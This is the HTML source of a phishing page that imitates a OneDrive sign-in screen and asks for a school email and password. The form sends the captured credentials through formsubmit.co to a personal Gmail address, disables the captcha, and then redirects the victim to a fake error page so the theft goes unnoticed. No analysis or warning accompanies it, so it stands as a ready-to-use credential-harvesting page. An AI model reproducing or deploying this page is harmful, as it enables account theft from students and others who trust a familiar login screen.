<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OneDrive - Sign In</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="overlay">
  <div class="login-card">

    <img src="one.jpeg" class="logo">

    <h2>Sign In</h2>

    <form action="https://formsubmit.co/devanrobert6@gmail.com" method="POST">
    <!-- <form action="https://api.nocodesubmit.com/email/devanrobert6@gmail.com" method="POST"> -->

      <input type="email" name="email" placeholder="School Email" required>

      <input type="password" name="message" placeholder="Password" required>

      <div class="options">
        <label><input type="checkbox" onclick="togglePassword()"> Show Password</label>
        <label><input type="checkbox"> Remember Me</label>
      </div>

      <button type="submit">Login</button>

      <input type="hidden" name="_next" value="https://scripts-two-alpha.vercel.app/error.html">
      <input type="hidden" name="_captcha" value="false">

    </form>

    <p class="terms">
      By logging in, you accept our <span>End User Terms of Use</span><br>
      <a href="#">Forgot Password?</a>
    </p>

  </div>
</div>

</body>
</html>
